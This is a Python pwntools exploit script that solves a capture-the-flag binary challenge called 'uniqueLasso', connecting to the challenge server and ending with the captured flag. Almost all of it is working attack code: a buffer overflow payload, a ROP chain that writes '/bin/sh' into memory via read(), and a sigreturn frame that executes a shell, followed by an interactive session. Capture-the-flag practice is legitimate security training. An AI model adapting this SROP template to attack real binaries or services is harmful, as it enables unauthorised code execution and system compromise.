#!/usr/bin/env python3

# buffer overflow -> read syscall to store /bin/sh on some writeable address -> sigrop

from pwn import *

#: CONNECT TO CHALLENGE SERVERS
binary = ELF('./uniqueLasso', checksec = False)
#libc = ELF('./libc.so.6', checksec = False)

#p = process('./uniqueLasso')
#p = process('./uniqueLasso', env = {'LD_PRELOAD' : libc.path})
p = remote("lasso.sdc.tf", 1337)

#: GDB SETTINGS
breakpoints = ['break *main + 129', 'break *main']
#gdb.attach(p, gdbscript = '\n'.join(breakpoints))

#: EXPLOIT INTERACTION STUFF
context.arch = 'amd64'
pop_rdi = 0x4006a6
pop_rdx = 0x44a0a5
pop_rsi = 0x410b63
pop_rax = 0x4005af
syscall = 0x40125c

sigretframe = SigreturnFrame(kernel = 'amd64')
sigretframe.rax = 59
sigretframe.rdi = 0x6b6000
sigretframe.rdx = 0
sigretframe.rsi = 0
sigretframe.rip = syscall

payload = cyclic(14)
#: read(stdin, 0x6b6000, 0x10)
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0xf) #: syscall does not ret after, but goes in a loop where rdx is moved into rax
payload += p64(pop_rsi)
payload += p64(0x6b6000)
payload += p64(pop_rax)
payload += p64(0x0)
payload += p64(syscall)
payload += bytes(sigretframe)

#: PWN THY VULNS
p.recvuntil(b'long)\n')
p.sendline(payload)
time.sleep(6.9)
p.sendline('/bin/sh\x00')
p.interactive()

#: sdctf{H0w_l0nG_w45_uR_L4ss0_m1n3_w45_ju5T_5}